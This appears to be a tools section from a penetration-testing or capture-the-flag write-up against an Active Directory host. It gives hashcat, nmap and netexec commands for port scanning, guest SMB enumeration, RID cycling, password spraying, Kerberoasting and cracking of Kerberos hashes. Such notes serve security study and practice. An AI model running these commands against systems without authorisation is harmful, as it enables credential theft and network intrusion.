## Tools Used

---

#### hashcat
`Crack password hashes using various methods`

```
hashcat -m 13100 khash.txt /usr/share/wordlists/rockyou.txt
```

> -m, --hash-type=NUM
>> Hash-type ID (see hashcat --help for 350+ types like 0=MD5, 1000=NTLM)

---

#### nmap

`nmap - Network exploration tool and security / port scanner`

```
nmap $TARGET
```

```
nmap -p- $TARGET -Pn
```

```
nmap -sVC -p 53,88,135,139,189,445,464,593,636,3268,3269,3389,5985,9389,5985,9389,49664,49667,49673,49113,49804 $TARGET -Pn
```


>-p (port_range)
>> Port specification: Specifies which ports to scan (e.g., -p 80,443, -p 1-1024, -p- for all ports).

> -Pn: Treat all hosts as online -- skip host discovery

>-sC: equivalent to --script=default

>-sV: Probe open ports to determine service/version info

---

#### netexec
`A swiss army knife for pentesting networks`

```
nxc smb <Domain Name> -u guest -p ''
```

```
nxc smb <Domain Name> -u guest -p '' --shares
```

```
nxc smb <Domain Name> -u guest -p '' --rid >> nxc-cmd.txt
```

```
nxc smb $TARGET -u usernames.txt -p usernames.txt --no-bruteforce | grep -v FAILIURE
```

```
nxc ldap $TARGET -u <username> -p <password> --kerberoasting khash.txt
```

`netexec protocol target [-u user] [-p pass] [-H hash] [options]`

>--shares
>> Enumerate shares.

> --kerberoasting 
>> Extracts Kerberos service tickets for accounts with SPNs.

> --no-bruteforce
>> Disables password brute‑forcing.

> --rid
>> Enumerates domain users and groups by cycling through Relative Identifiers (RIDs).

---
